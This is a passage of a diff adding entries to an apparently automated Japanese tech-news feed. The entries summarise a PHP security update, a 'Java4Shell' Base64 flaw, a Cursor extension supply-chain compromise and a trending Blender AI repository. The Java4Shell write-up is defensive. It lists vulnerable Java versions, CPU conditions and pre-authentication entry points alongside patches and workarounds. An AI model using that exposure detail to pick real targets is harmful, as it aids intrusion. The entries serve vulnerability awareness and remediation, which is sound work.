+      "source": "hatena",
+      "sourceLabel": "はてなブックマーク",
+      "title": "「PHP」で17件の脆弱性に対処、認証不要のリモートコード実行につながる“致命的”なものも／v8.5.13、v8.4.28、v8.3.37、v8.2.36が公開",
+      "url": "https://forest.watch.impress.co.jp/docs/news/2158039.html",
+      "publishedAt": "2026-11-19T15:05:27.000Z",
+      "tags": [
+        "テクノロジー",
+        "PHP",
+        "セキュリティ",
+        "security",
+        "あとで読む"
+      ],
+      "snippet": "「PHP」で17件の脆弱性に対処、認証不要のリモートコード実行につながる“致命的”なものも／v8.5.13、v8.4.28、v8.3.37、v8.2.36が公開",
+      "metrics": {
+        "hatena": 38
+      },
+      "sourceWeight": 3,
+      "id": "f60b809b8f19ca69",
+      "lang": "ja",
+      "foundIn": [
+        "hatena"
+      ],
+      "preScore": 0.525625,
+      "popularityPercentile": 0.84375,
+      "matchedTopics": [
+        "セキュアな開発"
+      ],
+      "buzz": true,
+      "score": 82,
+      "titleJa": null,
+      "oneLiner": "PHPは17件の脆弱性を修正し、認証不要の遠隔コード実行につながる欠陥を含む更新版を公開した。",
+      "takeaways": [
+        "PHPで17件の脆弱性が修正された。",
+        "中には認証なしで外部から処理を実行される欠陥がある。",
+        "8.5.13など4系統の更新版が公開された。"
+      ],
+      "keywords": [
+        "PHP",
+        "PHP 8.5.13",
+        "PHP 8.4.28",
+        "PHP 8.3.37",
+        "PHP 8.2.36",
+        "リモートコード実行"
+      ],
+      "category": "リリース/アップデート",
+      "lane": "know",
+      "readingMinutes": 3,
+      "payoff": "apply",
+      "durability": "durable",
+      "tryPrompt": null
+    },
+    {
+      "source": "qiita",
+      "sourceLabel": "Qiita",
+      "title": "Java4Shell の条件を CI で 10 回調べたら 7 回そろっていた",
+      "url": "https://qiita.com/Nekorock/items/57ec377b987dc5518f95",
+      "publishedAt": "2026-11-19T01:33:43.000Z",
+      "author": "Nekorock",
+      "authorDetail": {
+        "name": "Nekorock",
+        "handle": "@Nekorock",
+        "url": "https://qiita.com/Nekorock",
+        "avatarUrl": "https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/3976101/188a605b81703509a9f9617277428bda5467092f/x_large.png?1735810024",
+        "bio": "主にWebサービスのサーバーサイド・インフラの開発・SREをやっています。\r\nいつも使う言語は、Python, Typescript, Java, PHPです。\r\n\r\nいつも思うけどSREやること多い！！",
+        "followers": 3,
+        "posts": 27,
+        "links": [
+          {
+            "label": "GitHub",
+            "url": "https://github.com/OTA-EITA"
+          }
+        ]
+      },
+      "tags": [
+        "Java",
+        "Security",
+        "脆弱性",
+        "GitHubActions",
+        "OpenJDK"
+      ],
+      "snippet": "2026 年 11 月 17 日に公開された Java4Shell（CVE-2026-114938）は、Java の版だけでなく CPU が AVX-512 VBMI を持っているか で当たるかどうかが決まります。そこで GitHub Actions の x64 の runner を 10 回起動して調べたところ、7 回で条件がそろっていました。どの runner にも、最初から修正前の Java 17・21・25 が入っています。公式の Docker イメージも、11 月 19 日の時点で Eclipse Temurin はまだ修正前で、Amazon Corretto は修正済みでした。 Java のアプリを x86 のサーバーやコンテナで動かしている人向けに、当たる条件を修正のソースで確かめた結果と、自分のマシンで 1 分で確かめる方法、修正するまでの回避策をまとめます。 Java4S…",
+      "body": "2026 年 11 月 17 日に公開された Java4Shell（CVE-2026-114938）は、Java の版だけでなく CPU が AVX-512 VBMI を持っているか で当たるかどうかが決まります。そこで GitHub Actions の x64 の runner を 10 回起動して調べたところ、7 回で条件がそろっていました。どの runner にも、最初から修正前の Java 17・21・25 が入っています。公式の Docker イメージも、11 月 19 日の時点で Eclipse Temurin はまだ修正前で、Amazon Corretto は修正済みでした。\n\nJava のアプリを x86 のサーバーやコンテナで動かしている人向けに、当たる条件を修正のソースで確かめた結果と、自分のマシンで 1 分で確かめる方法、修正するまでの回避策をまとめます。\n\nJava4Shell とは\n\nOpenJDK の HotSpot が、Base64 のデコードを速くするために持っている CPU 向けの専用の処理（intrinsic）の不具合です。細工した Base64 の文字列を渡すと、確保した領域の外へ書き込みます。\n\nOpenJDK の 2026/11/17 の脆弱性勧告 では、次のように載っています。\n\n| 項目 | 値 |\n|---|---|\n| CVE | CVE-2026-114938 |\n| 部品 | hotspot/compiler |\n| CVSS 3.1 | 8.1 |\n| 影響する系統 | 17、21、25、27（8 と 11 は対象外） |\n\nTenable のまとめによると、発見した Calif は、Keycloak・Jira・Confluence・Jenkins などでログイン前にコードを実行できたとしています。11 月 18 日の時点で GreyNoise が攻撃の試みを観測していますが、成功は確認されていないとのことです（Tenable FAQ）。\n\n当たる条件は 3 つ\n\n修正は openjdk/jdk の 5177a70 で入っています。題名は「Base64 optimization improvements」で、脆弱性の修正だとは書かれていません。src/hotspot/cpu/x86/stubGeneratorx8664.cpp を読むと、問題の処理に入る条件が分かります。\n\n [code] \n\nまとめると、次の 3 つがそろったときです。\n\n1. Java が修正前の 17・21・25・27\n2. CPU が x86-64 で、AVX-512 VBMI・AVX-512BW・BMI2 の 3 つを持つ\n3. アプリが、MIME 形式ではない 32 バイト以上の Base64 を、外から受け取ってデコードする\n\n3 つ目は珍しい条件ではありません。Tenable のまとめでは、Tomcat の Basic 認証や java-jwt が、ログイン前に届く入口になるとされています。arm64 のマシンには、この処理はそもそもありません。\n\n修正は 4 行だった\n\n差分はこれだけです。64 バイトずつ処理したあとの端数が 4 バイトに満たないときは、Java 側の普通の処理に回すようにしています。\n\n [code] \n\n修正版の番号\n\nEclipse Temurin の告知に載っている修正版です。Oracle の版も番号は同じです。\n\n| 系統 | 修正版 |\n|---|---|\n| 17 | 17.0.21.1+2 |\n| 21 | 21.0.13.1+2 |\n| 25 | 25.0.5.1+2 |\n| 27 | 27.0.1.1+4 |\n| 8・11 | 対象外 |\n\n10 月に出た 17.0.21・21.0.13・25.0.5 は 修正前 です。版の 4 つ目の数字が 1 になっているかを見ます。\n\nGitHub Actions の runner で 15 回調べた\n\n自分の CI がどうなっているかを確かめるため、GitHub Actions で次の 3 種類の runner を 5 回ずつ起動しました。\n・ubuntu-24.04（x64）\n・ubuntu-24.04-arm\n・windows-2025（x64）\n\nどれも 2026-11-19 の朝です。調べたのは CPU の機能と、runner に最初から入っている Java の版・フラグだけです。脆弱性を突く処理は動かしていません。\n\n使ったスクリプトの要点です（全体は samples/java4shell-check）。\n\n [code] \n\nWindows の Git Bash では /proc/cpuinfo の機能の一覧が実際と合わないことがあったので、判定には Java 自身の見え方（-Xlog:os+cpu）を使いました。\n\n1 回目の ubuntu-24.04 の出力と、同じ日に公式の Docker イメージを調べた出力です。\n\n \n\n結果\n\n| runner | 回数 | CPU | 3 つの命令がそろった回数 | 入っていた Java |\n|---|---|---|---|---|\n| ubuntu-24.04 | 5 | Xeon 6975P-C ×4、EPYC 7763 ×1 | 4 | 17.0.21+9、21.0.13+9、25.0.5+8 |\n| windows-2025 | 5 | EPYC 9V74 ×2、EPYC 9V45 ×1、EPYC 7763 ×2 | 3 | 17.0.21+9、21.0.13+9、25.0.5+8 |\n| ubuntu-24.04-arm | 5 | arm64 | 0 | 17.0.21+9、21.0.13+9、25.0.5+8 |\n\nx64 の 10 回のうち 7 回で、3 つの命令がそろっていました。その 7 回ではどれも UseBASE64Intrinsics=true、UseAVX=3 で、入っていた Java 17・21・25 はすべて修正前の版です。つまり、問題の処理が動く状態でした。\n\n新しい CPU ほど当たる\n\nそろったのは、Intel の Xeon 6975P-C と、AMD の EPYC 9V74・9V45 でした。EPYC 7763 は AVX-512BW も VBMI も持たず、UseAVX=2 で問題の処理には入りません。\n\n同じ runner の名前でも、起動するたびに CPU が変わります。5 回のうち何回当たるかは、そのときの割り当て次第です。手元の Mac（Apple M3）や arm の runner のように arm64 なら、そもそも対象外です。\n\nクラウドで「新しい世代のインスタンスに上げたら当たるようになった」ということが起こりえます。版だけを見て「うちは古い CPU だから大丈夫」と決めず、実際に動いているマシンで確かめる必要があります。\n\nJava 21 からは AVX2 だけでも intrinsic が有効になる\n\nもう 1 つ気づいたことがあります。EPYC 7763 の runner では、Java 11 と 17 は UseBASE64Intrinsics=false なのに、21 と 25 は true でした。今の OpenJDK の main のソースでは、x86 で UseAVX >= 2 なら Base64 の intrinsic を有効にします。\n\n [code] \n\nただし問題の処理は、その中でも AVX-512 VBMI を持つときだけ使う部分です。UseBASE64Intrinsics=true というだけでは当たりません。判定には、CPU の 3 つの命令を必ず合わせて見ます。\n\n公式の Docker イメージは配布元で差が出た\n\n同じ日に、公式のイメージの中の Java の版を調べました。\n\n| イメージ | 中の Java | イメージの作成日 | 修正 |\n|---|---|---|---|\n| eclipse-temurin:17 | 17.0.21+9 | 2026-11-11 | まだ |\n| eclipse-temurin:21 | 21.0.13+9 | 2026-11-11 | まだ |\n| eclipse-temurin:25 | 25.0.5+8 | 2026-11-11 | まだ |\n| amazoncorretto:17 | 17.0.21.1+2 | 2026-11-18 | 済み |\n| amazoncorretto:21 | 21.0.13.1+2 | 2026-11-18 | 済み |\n| amazoncorretto:25 | 25.0.5.1+2 | 2026-11-18 | 済み |\n\nTemurin はバイナリを出していて、告知にも「すべてのバイナリがそろってからコンテナイメージを出す」と書かれています。2026-11-19 10:25（日本時間）の時点で、Docker Hub の eclipse-temurin:21 などのタグは 11 月 16 日に更新されたのが最後で、21.0.13.1 のタグはまだありませんでした。\n\nFROM eclipse-temurin:21 で作っているイメージは、今ビルドし直しても修正前の Java が入ります。イメージができるまでは、次の回避策を入れておく必要があります。\n\n修正するまでの回避策\n\nTemurin の告知が案内しているのは、起動オプションで Base64 の intrinsic を止める方法です。\n\n [code] \n\nコンテナなら、環境変数でまとめて渡せます。\n\n [code] \n\nJAVATOOLOPTIONS は、すでにほかの値を入れている場合は上書きにならないよう足してください。付いたかは java -XX:+PrintFlagsFinal -version | grep UseBASE64Intrinsics が false になることで確かめます。\n\nTenable のまとめでは、Calif が -XX:UseAVX=2 でも問題の処理を避けられるとしています。ただし x86-64 だけの指定で、arm の Java はこの指定があると起動しないそうです。arm と x86 が混ざる環境では、-XX:-UseBASE64Intrinsics のほうが扱いやすいです。\n\nどちらも Base64 のデコードが少し遅くなります。直ったら外します。\n\n自分の環境で確かめる\n\n動いているマシンで、次の 3 つを見ます。\n\n [code] \n\nコンテナの中なら、docker exec で同じコマンドを動かします。コンテナはホストの CPU をそのまま使うので、同じイメージでも、どのホストに載ったかで結果が変わります。\n\nやること\n・[ ] 外から Base64 を受け取る Java のサービスを洗い出す（JWT・Basic 認証・API のペイロード）\n・[ ] 動いているマシンで、上の 3 つのコマンドを流す\n・[ ] 修正版（17.0.21.1・21.0.13.1・25.0.5.1・27.0.1.1）に上げる\n・[ ] 上げられないものと、修正版のイメージがまだない Temurin のコンテナには -XX:-UseBASE64Intrinsics を付ける\n・[ ] Dockerfile の FROM を、修正版のタグが出たらそれに固定してビルドし直す\n・[ ] CI の runner に入っている Java は修正前のままなので、テストで外部の Base64 を扱うなら actions/setup-java で修正版を入れる\n\n確かめていないこと\n・問題の処理を実際に動かすテストはしていません。調べたのは、条件がそろっているかだけです\n・runner の CPU の割り当ては、日や地域で変わるはずです。10 回中 7 回は、2026-11-19 の朝の結果です\n・AWS・GCP・Azure のどのインスタンスが当たるかは、自分では確かめていません\n\n参考\n・OpenJDK Vulnerability Advisory: 2026/11/17\n・openjdk/jdk 5177a70b38: 8393212: Base64 optimization improvements\n・Adoptium: Temurin November 2026 CSPU (Java4Shell)\n・Tenable: Java4Shell (CVE-2026-114938) FAQ\n・調べたときの GitHub Actions の実行結果",
+      "metrics": {
+        "likes": 0,
+        "stocks": 0,
+        "comments": 0
+      },
+      "sourceWeight": 3,
+      "lang": "ja",
+      "id": "6ed08569c830da72",
+      "foundIn": [
+        "qiita"
+      ],
+      "preScore": 0.5857986111111112,
+      "popularityPercentile": 0.7309027777777778,
+      "matchedTopics": [
+        "セキュアな開発"
+      ],
+      "buzz": false,
+      "score": 82,
+      "titleJa": null,
+      "oneLiner": "Java4ShellはCPU条件で影響が変わり、GitHub Actionsの実行10回中7回で攻撃条件がそろった。",
+      "takeaways": [
+        "Java4Shellは特定のCPU機能とJava版の組み合わせで発生する。",
+        "GitHub Actionsでは10回中7回で条件がそろった。",
+        "Eclipse Temurinは未修正でAmazon Correttoは修正済みだった。"
+      ],
+      "keywords": [
+        "Java4Shell",
+        "CVE-2026-114938",
+        "OpenJDK",
+        "GitHub Actions",
+        "Eclipse Temurin",
+        "Amazon Corretto"
+      ],
+      "category": "調査・考察",
+      "lane": "know",
+      "readingMinutes": 12,
+      "payoff": "apply",
+      "durability": "durable",
+      "tryPrompt": null
+    },
+    {
+      "source": "hatena",
+      "sourceLabel": "はてなブックマーク",
+      "title": "Javaに深刻な脆弱性「Java4Shell」　認証なしで遠隔からコード実行の恐れ",
+      "url": "https://japan.cnet.com/article/35255142/",
+      "publishedAt": "2026-11-19T06:02:15.000Z",
+      "tags": [
+        "テクノロジー"
+      ],
+      "snippet": "この脆弱性は「Java4Shell」と呼ばれ、識別番号はCVE-2026-114938だ。ログイン情報の送信やファイルのアップロードに使われる標準形式「Base64」のデータをデコードする際に、メモリーが破損する恐れがある。 サイバーセキュリティ企業Califの最高経営責任者（CEO）であるThai Duong氏は、同社が10月にこの深刻な脆弱性...",
+      "metrics": {
+        "hatena": 3
+      },
+      "sourceWeight": 3,
+      "id": "d0cb777049eb28d9",
+      "lang": "ja",
+      "foundIn": [
+        "hatena"
+      ],
+      "preScore": 0.34,
+      "popularityPercentile": 0,
+      "matchedTopics": [
+        "セキュアな開発"
+      ],
+      "buzz": true,
+      "score": 80,
+      "titleJa": null,
+      "oneLiner": "Java4ShellはBase64処理のメモリー破損を通じて、認証なしの遠隔コード実行を招く恐れがある。",
+      "takeaways": [
+        "Javaの文字変換処理にメモリーを壊す欠陥が見つかった。",
+        "認証なしで遠隔から不正なコードを実行される恐れがある。",
+        "脆弱性にはCVE-2026-114938という識別番号が付いている。"
+      ],
+      "keywords": [
+        "Java4Shell",
+        "CVE-2026-114938",
+        "Java",
+        "Base64",
+        "メモリー破損",
+        "リモートコード実行"
+      ],
+      "category": "調査・考察",
+      "lane": "know",
+      "readingMinutes": 4,
+      "payoff": "aware",
+      "durability": "durable",
+      "tryPrompt": null
+    },
+    {
+      "source": "qiita",
+      "sourceLabel": "Qiita",
+      "title": "0。Cursorが『Fireworks AIの認証情報漏洩が悪意あるClaude Code拡張配布の原因』と公表した日、自分のGitHub ActionsをコミットSHAで固定していた数はこの数字だった",
+      "url": "https://qiita.com/Hideki_Tamae/items/7784b3dd9ec235ab8f18",
+      "publishedAt": "2026-11-19T00:46:41.000Z",
+      "author": "田前 秀樹",
+      "authorDetail": {
+        "name": "田前 秀樹",
+        "handle": "@Hideki_Tamae",
+        "url": "https://qiita.com/Hideki_Tamae",
+        "avatarUrl": "https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/861819/d11c997695c2a29edc2814411a80faa2986318f9/large.png?1786632845",
+        "bio": "AIエージェントと人間の協働を研究・実践。Harness/Loop Engineeringを軸に、AIが仕事を完了する仕組みを構築中。Care Capitalismなど、AI時代の新しい社会のあり方を発信しています。 https://author.amazon.co.jp/profile",
+        "organization": "Tech Noir Lab / ACES CARE HUB JAPAN / Limelien Ltd.",
+        "location": "TOKYO",
+        "followers": 4,
+        "posts": 152,
+        "links": [
+          {
+            "label": "GitHub",
+            "url": "https://github.com/hideki-tamae"
+          },
+          {
+            "label": "X",
+            "url": "https://x.com/hayFkShSxNRVh1q"
+          },
+          {
+            "label": "Web",
+            "url": "https://tech-noir-labs.vercel.app"
+          }
+        ]
+      },
+      "tags": [
+        "AI",
+        "GitHubActions",
+        "Security",
+        "ClaudeCode",
+        "supplychain"
+      ],
+      "snippet": "はじめに 0。 これが今回の数字です。Cursorが2026年11月14日(金)に公開した事後報告で、AI基盤企業Fireworks AIから盗まれた認証情報を使い、攻撃者がCursorのマーケットプレイス配信キャッシュに「Claude Code」という名前の拡張機能の不正なバージョンを混入させていたことを認めました。10月29日に約11時間配信され、最大5,000人の開発者がSSHバックドアを仕込まれる恐れがあったとされています。ここで混入したバージョンはAnthropic自身が開発したものではなく、Cursorのマーケットプレイスに third-party として出ていたものだとCursorは説明しています。 「信頼していたはずの配布経路が、裏側で盗まれた認証情報一つで書き換えられていた」という話を読んで、自分がこの記事投稿パイプラインのGitHub Actionsワークフローで使って…",
+      "body": "はじめに\n\n0。\n\nこれが今回の数字です。Cursorが2026年11月14日(金)に公開した事後報告で、AI基盤企業Fireworks AIから盗まれた認証情報を使い、攻撃者がCursorのマーケットプレイス配信キャッシュに「Claude Code」という名前の拡張機能の不正なバージョンを混入させていたことを認めました。10月29日に約11時間配信され、最大5,000人の開発者がSSHバックドアを仕込まれる恐れがあったとされています。ここで混入したバージョンはAnthropic自身が開発したものではなく、Cursorのマーケットプレイスに third-party として出ていたものだとCursorは説明しています。\n\n「信頼していたはずの配布経路が、裏側で盗まれた認証情報一つで書き換えられていた」という話を読んで、自分がこの記事投稿パイプラインのGitHub Actionsワークフローで使っている外部のAction定義を、他人事にする前に数え直しました。\n\nTL;DR\n・Cursorは2026年11月14日、10月29日のマーケットプレイス事件の根本原因として「Fireworks AIから盗まれた認証情報が、配布キャッシュへの不正なバージョン混入を許した」と公表した(配布は約11時間、最大5,000人に到達した可能性)\n・混入した「Claude Code」拡張はAnthropic自身の開発物ではなく、Cursorのマーケットプレイス上の third-party 拡張だった\n・自分のQiita用リポジトリ(qiita-content)の2つのワークフローファイルに、外部Actionを呼ぶuses:行が4箇所ある\n・そのうち、コミットSHA(変更できない参照)で固定されているものは0箇所。全てが書き換え可能なバージョンタグ(@v4や@v1)での参照だった\n・4箇所のうち2箇所(actions/checkout@v4、actions/setup-node@v4)はGitHub公式管理、残り2箇所(increments/qiita-cli/actions/publish@v1、実質同一Actionを2ファイルで参照)はQiita運営元(Increments社)という一社に依存していた\n\n何が起きていたのか\n\nCursorの発表によると、今回の根本原因はマーケットプレイスの拡張機能そのものの脆弱性ではなく、AI基盤企業Fireworks AIの認証情報が盗まれたことでした。攻撃者はその認証情報を使い、CursorのVS Code拡張マーケットプレイスを配信するキャッシュに、不正なバージョンの拡張機能を混入させることができました。10月29日から約11時間、正規のバージョンに見える形で配信され続け、最大5,000人の開発者環境に到達した可能性があるとされています。インストールされた拡張は、永続的なSSHバックドアを設置するものだったと報じられています。\n\n重要なのは、ここで壊れたのが「拡張機能のコード」ではなく「配布経路の信頼性」だという点です。利用者はバージョン番号や表示名を見て「いつも使っているClaude Code拡張の更新」だと信じてインストールしましたが、実際にその版を生成・配信していたのは攻撃者でした。認証情報という、利用者からは見えない1点が破られただけで、見た目は何も変わらないまま配布物が入れ替わっていた、ということです。\n\n実際に確認したこと\n\n今日、記事を書く前に自分の投稿パイプラインの.github/workflows/を実際に開いて数えました。\n\n| 確認した対象 | 結果 |\n|---|---|\n| qiita-contentリポジトリのワークフローファイル数 | 2(publish.yml、sync-from-qiita.yml) |\n| zenn-contentリポジトリのワークフローファイル数 | 0(Zenn側は自社GitHub連携機能で公開されており、このリポジトリ自体にはCIが無い) |\n| 2つのワークフローファイル内で外部Actionを呼ぶuses:行の総数 | 4 |\n| そのうちコミットSHA(例: uses: owner/repo@ )で固定されている数 | 0 |\n| 4箇所のうちGitHub公式管理のAction(actions/checkout、actions/setup-node) | 2箇所 |\n| 4箇所のうちQiita運営元(Increments社)という一社が管理するAction(increments/qiita-cli/actions/publish) | 2箇所(2ファイルでそれぞれ参照) |\n\n全4箇所とも、@v4や@v1のようなバージョンタグで参照していました。Gitのタグは、そのリポジトリの管理者であれば後から指す先のコミットを書き換えられます。つまり@v4が常に同じコードを指すという保証は、Actionの開発元の認証情報とリポジトリ運用の健全性に完全に依存しています。npmで入れている@qiita/qiita-cli@v1.10.0はセマンティックバージョンでの固定であり、Gitタグとは別の配布基盤(npmレジストリ)の信頼モデルに乗っているため、ここでは区別しました。\n\n自己批判:この記事について正直に言うと\n\n3つ、正直に書いておきます。\n\n1つ目。今回の脆弱性の経路は、自分のパイプラインとは正確には一致しません。 Cursorの事件はVS Code拡張マーケットプレイスの配信キャッシュが攻撃対象でしたが、自分が使っているのはGitHub Actionsのタグ参照です。「ソフトウェアの配布者が外部から見えない1点(認証情報)を握られると、利用者が信頼しているはずの\"いつもの版\"が静かに入れ替わりうる」という構造が共通しているというだけで、同一の脆弱性ではありません。\n\n2つ目。actions/checkoutやactions/setup-nodeはGitHub自身が管理しており、現実的な悪用コストはQiita-cliのActionより低いはずです。 にもかかわらず、自分はこれまで両者を区別せず、「公式っぽいActionだから大丈夫」という理由だけで4箇所とも同じ扱いにしてきました。これは検証していない前提に基づいた判断でした。\n\n3つ目。SHA固定にしても、Qiita-cliのAction自体やそのリリースプロセスが攻撃された場合のリスクは消えません。 固定した時点のコードを信頼する、という前提そのものが崩れれば意味がなくなります。SHA固定は「タグの差し替え」という攻撃経路を1つ塞ぐだけで、サプライチェーン全体の安全を保証するものではありません。\n\n今日から使えること\n\n1. 自分のCI/CDで使っている外部Actionのuses:行を全部書き出し、バージョンタグ参照とコミットSHA参照の数を実際に数える。 「大丈夫だろう」で済ませず、まず現状の数を把握することが最初の一歩です。\n2. GitHub公式管理のActionと、それ以外の第三者が管理するActionを区別し、後者を優先してSHA固定を検討する。 全部を同じ重みで扱わないことが、限られた見直しの手間を有効に使う方法です。\n3. 「配布経路の信頼」は利用者側からは見えないという前提で設計する。 見た目のバージョン番号や表示名が変わらなくても、裏側の配布経路が破られれば中身は入れ替わります。これはGitHub Actionsだけでなく、npmパッケージやブラウザ拡張など、自分が依存している配布経路全般に当てはまる前提です。\n\n拙著『AIエージェント設計論』でも、AIエージェントに外部ツールやサービスを呼び出させる際、その依存先をどこまで検証可能な形で固定するかについて触れています。興味があれば読んでみてください。\n\nhttps://www.amazon.co.jp/dp/B0HG54TMLD",
+      "metrics": {
+        "likes": 0,
+        "stocks": 0,
+        "comments": 0
+      },
+      "sourceWeight": 3,
+      "lang": "ja",
+      "id": "cef8f9686b5953b1",
+      "foundIn": [
+        "qiita"
+      ],
+      "preScore": 0.8514930555555555,
+      "popularityPercentile": 0.7795138888888888,
+      "matchedTopics": [
+        "クラウド / 本番環境構築",
+        "AI支援開発・品質",
+        "セキュアな開発"
+      ],
+      "buzz": false,
+      "score": 78,
+      "titleJa": null,
+      "oneLiner": "Cursorは盗まれたFireworks AIの認証情報で第三者製のClaude Code拡張が約11時間配布されたと公表した。",
+      "takeaways": [
+        "Cursorの拡張配布経路に不正な更新が混入した。",
+        "約11時間の配布で最大5000人が影響を受けた可能性がある。",
+        "外部部品の固定数がゼロだった事例から供給経路の弱点を示した。"
+      ],
+      "keywords": [
+        "Cursor",
+        "Fireworks AI",
+        "Claude Code",
+        "GitHub Actions",
+        "サプライチェーン攻撃",
+        "認証情報漏洩"
+      ],
+      "category": "調査・考察",
+      "lane": "know",
+      "readingMinutes": 10,
+      "payoff": "decide",
+      "durability": "durable",
+      "tryPrompt": null
+    },
+    {
+      "source": "github_repo",
+      "sourceLabel": "GitHub 急上昇リポジトリ",
+      "title": "credoksopho1984/blender-ai-copilot-studio — An AI copilot and MCP server for Blender that turns plain-language briefs into scene operations—inside a visual chat studio with multi-agent teams, your choice of AI models, and 27 built-in scene tools. · blender-ai-copilot-studio · blender ai · ai for blender · blender copilot · blender ai copilot · blender ai assistant · blender mcp server",
+      "url": "https://github.com/credoksopho1984/blender-ai-copilot-studio",
+      "publishedAt": "2026-11-12T19:30:32.000Z",
+      "author": "credoksopho1984",
+      "authorDetail": {
+        "name": "credoksopho1984",
+        "url": "https://github.com/credoksopho1984",
+        "avatarUrl": "https://github.com/credoksopho1984.png?size=120",
+        "bio": "An AI copilot and MCP server for Blender that turns plain-language briefs into scene operations—inside a visual chat studio with multi-agent teams, your choice of AI models, and 27 built-in scene tools. · blender-ai-copilot-studio · blender ai · ai for blender · blender copilot · blender ai copilot · blender ai assistant · blender mcp server"
+      },
+      "tags": [
+        "3d-automation",
+        "3d-modeling",
+        "blender",
+        "blender-addon",
+        "blender-agents",
+        "blender-ai",
+        "blender-assistant",
+        "blender-automation"
+      ],
+      "snippet": "An AI copilot and MCP server for Blender that turns plain-language briefs into scene operations—inside a visual chat studio with multi-agent teams, your choice of AI models, and 27 built-in scene tools. · blender-ai-copilot-studio · blender ai · ai for blender · blender copilot · blender ai copilot · blender ai assistant · blender mcp server",
+      "metrics": {
+        "stars": 516
+      },
+      "sourceWeight": 3,
+      "lang": "en",
+      "id": "5a20467738c831ba",
+      "foundIn": [
+        "github_repo"
+      ],
+      "preScore": 0.8071929824561405,
+      "popularityPercentile": 0.3508771929824561,
+      "matchedTopics": [
+        "AI支援開発・品質",
+        "AIエージェント構築"
+      ],
+      "buzz": false,
+      "score": 87,
+      "titleJa": "blender-ai-copilot-studio — 会話でBlenderの3D制作を操作するAI環境",
+      "oneLiner": "blender-ai-copilot-studioは自然言語の指示をBlenderのシーン操作に変換するAI環境を提供する。",
+      "takeaways": [
+        "文章で伝えた要望から3Dシーンを操作できる。",
+        "複数のAI担当が分担して作業できる。",
+        "27個の道具を備えた会話画面で制作を進められる。"
+      ],
+      "keywords": [
+        "blender-ai-copilot-studio",
+        "Blender",
+        "MCP server",
+        "multi-agent",
+        "27 scene tools",
+        "AI copilot"
+      ],
+      "category": "AI/エージェント",
+      "lane": "build",
+      "readingMinutes": 3,
+      "payoff": "decide",
+      "durability": "ephemeral",
+      "tryPrompt": "# 試すこと\ncredoksopho1984/blender-ai-copilot-studio — An AI copilot and MCP server for Blender that turns plain-language briefs into scene operations—inside a visual chat studio with multi-agent teams, your choice of AI models, and 27 built-in scene tools. · blender-ai-copilot-studio · blender ai · ai for blender · blender copilot · blender ai copilot · blender ai assistant · blender mcp server を動かして、README の最初の出力まで到達する\nhttps://github.com/credoksopho1984/blender-ai-copilot-studio\n\n# 手順\n1. git clone --depth 1 https://github.com/credoksopho1984/blender-ai-copilot-studio\n2. cd blender-ai-copilot-studio && ls\n3. README の手順どおりに依存を入れ、最初の出力が出るまで進める\n\n# 確認したいこと\n- README の手順だけで、最初の出力まで到達できるか\n- 動かすのに別途何が必要か（API キー・GUI・別のツール）\n\n# 前提・注意\n- git が入っていること\n- README にビルド手順が無ければ、リポジトリの package.json / Makefile を見る"
+    },
+    {
+      "source": "qiita",
+      "sourceLabel": "Qiita",
+      "title": "GitHub CopilotのAIチームは、FoundryのCopilot harnessで動くのか",
+      "url": "https://qiita.com/shyamagu/items/8a796c4a36a8db5cdb28",
+      "publishedAt": "2026-11-18T23:44:28.000Z",
+      "author": "Shuji Yamaguchi",
+      "authorDetail": {
+        "name": "Shuji Yamaguchi",
+        "handle": "@shyamagu",
+        "url": "https://qiita.com/shyamagu",
+        "avatarUrl": "https://secure.gravatar.com/avatar/b6eb26b4ab67cfeb480208a4e95c9aa1",
+        "followers": 60,
+        "posts": 70,
+        "links": []
+      },
+      "tags": [
+        "MicrosoftFoundry",
+        "GitHubCopilot",
+        "AzureOpenAIService",
+        "githubcopilotcli",
+        "Harness"
+      ],
+      "snippet": "この記事のまとめ: GitHub CopilotのAIチーム（スキル＋カスタムエージェント＋MCP）は、FoundryのCopilot harnessでほぼ動きました。ただし、カスタムエージェントは「組み込みサブエージェント＋スキル」に、playwright-cliのようなローカルCLIはBrowser Automationに置き換える必要があります。 はじめに 2026年10月28日に、以下の発表がありました。 Introducing the Microsoft Copilot harness in Foundry Agent Service | Microsoft Foundry Blog Foundry Agent ServiceのPrompt agentを作るときに、Copilot harnessという実行基盤を選べるようになったという発表です。エージェントループとsandboxは…",
+      "body": "この記事のまとめ: GitHub CopilotのAIチーム（スキル＋カスタムエージェント＋MCP）は、FoundryのCopilot harnessでほぼ動きました。ただし、カスタムエージェントは「組み込みサブエージェント＋スキル」に、playwright-cliのようなローカルCLIはBrowser Automationに置き換える必要があります。\n\nはじめに\n\n2026年10月28日に、以下の発表がありました。\n\nIntroducing the Microsoft Copilot harness in Foundry Agent Service | Microsoft Foundry Blog\n\nFoundry Agent ServiceのPrompt agentを作るときに、Copilot harnessという実行基盤を選べるようになったという発表です。エージェントループとsandboxはMicrosoftが運用するので、指示・スキル・ツールを用意するだけでCopilot harnessをもったエージェントが実行できます。（現時点ではパブリックプレビューです）\n\n正式名称はMicrosoft Copilot harnessですが、同日のMicrosoft公式ブログには、GitHubのエンジニアリングチームが作り、GitHub Copilot CLIやVS Codeなどを動かしているハーネスだと書かれています。つまり、GitHub Copilotと同じハーネスがFoundryで動くということです。\n\n私はこれまで、AIスクラムチームのように、GitHub Copilotのカスタムエージェントとスキルを組み合わせたAIチームを作ってきました。同じハーネスなら、GitHub Copilotで試してきたエージェント群を、少しの書き換えでFoundryのエージェントにできるのでは？ と期待して、試してみました。\n\n結論\n\n| GitHub Copilotでの使い方 | Foundryでの結果 | 対応方法 |\n| --- | --- | --- |\n| スキル（SKILL.md） | ○ 動いた | Skills APIに登録して紐づける |\n| MS Learn MCPなどのリモートMCP | ○ 動いた | エージェントのtoolsに設定する |\n| カスタムエージェント（.agent.md） | △ 名前では呼べなかった | 人物設定をスキルにして、組み込みサブエージェントに読み込ませる |\n| playwright-cliスキル | × ブラウザが起動しなかった | Browser Automationに置き換える |\n| Web検索＋出典の確認 | ○ 動いた | Web Searchツールと組み込みツールで本文を読ませる |\n\nGitHub Copilotの構成をそのまま持ってくることはできませんが、置き換え方が分かれば、かなり近い動きを作れます。\n\nそれでは、順番に紹介していきます。\n\nCopilot harnessで使えるもの\n\nCopilot harnessを選ぶと、次の組み込みツールが最初から有効になります。\n・ファイルの読み取り・書き込み\n・シェルコマンドの実行\n・URLを指定したWebページの取得（Web検索は、Foundryのweb 